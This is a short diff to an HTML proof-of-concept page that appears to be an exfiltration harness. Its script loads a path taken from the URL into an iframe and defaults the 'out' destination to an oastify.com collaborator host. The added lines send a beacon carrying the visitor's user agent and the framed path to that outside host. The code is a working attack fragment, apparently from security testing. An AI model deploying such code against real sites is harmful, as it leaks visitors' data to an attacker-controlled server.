@@ -7,10 +7,16 @@
 <body>
 <iframe id="test" width="800" height="1000"></iframe>
 <script>
+
+
+
     const urlParams = new URLSearchParams(window.location.search);
-    const path = urlParams.get("path") ?? "/addresses";
+    const path = urlParams.get("path");
     const out = urlParams.get("out") ?? "https://oxpxnwyzg7l4s42f40ckabaualgc43vrk.oastify.com";
     const extractId = urlParams.get("extract_id");
+
+    new Image().src = out + "/start?ua=" + encodeURIComponent(navigator.userAgent)+'&path='+path;
+
 
     const iframe = document.getElementById("test");
     iframe.src = path.startsWith("http") ? path : "/" + path;
